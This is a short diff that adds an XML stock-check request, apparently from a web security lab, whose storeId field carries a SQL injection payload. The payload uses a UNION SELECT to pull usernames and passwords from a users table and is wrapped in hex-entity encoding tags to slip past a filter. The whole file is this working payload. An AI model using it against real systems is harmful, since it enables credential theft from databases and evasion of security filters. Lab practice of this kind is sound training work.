@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8"?>
+  <stockCheck>
+    <productId>
+      8
+    </productId>
+    <storeId>
+      <@hex_entities>
+        1 UNION SELECT username || '~' || password FROM users
+        <@/hex_entities>
+    </storeId>
+  </stockCheck>
